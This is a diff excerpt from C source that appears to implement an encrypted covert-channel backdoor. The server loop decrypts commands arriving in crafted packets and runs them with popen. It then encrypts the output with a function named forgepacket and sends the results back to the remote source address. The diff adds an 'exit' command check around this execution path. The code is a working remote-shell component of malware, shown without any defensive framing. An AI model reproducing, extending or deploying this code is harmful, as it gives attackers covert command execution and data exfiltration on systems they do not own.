@@ -326,21 +326,23 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
 
                     fprintf(stdout, "Decypher: %d | %s\n", decryptedtext_len, decryptedtext);
 
-                    // IF Exit command;
-                    // open = false;
+                    if (strcmp(decryptedtext, "exit") == 0)
+                        open = false;
+                    else
+                    {
+                        // Get Output
+                        char *output = (char *)malloc(OUTPUT_SIZE);
+                        fp = popen(decryptedtext, "r");
+                        fread(output, 1, OUTPUT_SIZE, fp);
+                        fprintf(stdout, "Return: %s \n", output);
 
-                    // Else
+                        // Cypher
+                        unsigned char *ciphertext = (unsigned char *)malloc(BUFF_SIZE * 2);
+                        int cypher_len = forgepacket(ciphertext, output);
 
-                    // Get Output
-                    char *output = (char *)malloc(OUTPUT_SIZE);
-                    fp = popen(decryptedtext, "r");
-                    fread(output, 1, OUTPUT_SIZE, fp);
-                    fprintf(stdout, "Return: %s \n", output);
-
-                    // CYpher and Send
-                    unsigned char *ciphertext = (unsigned char *)malloc(BUFF_SIZE * 2);
-                    int cypher_len = forgepacket(ciphertext, output);
-                    client(dest_addr, source_addr, dest_port, ciphertext, cypher_len);
+                        // Send
+                        client(dest_addr, source_addr, dest_port, ciphertext, cypher_len);
+                    }
 
                     // Reset Counters
                     packet_count = 0;
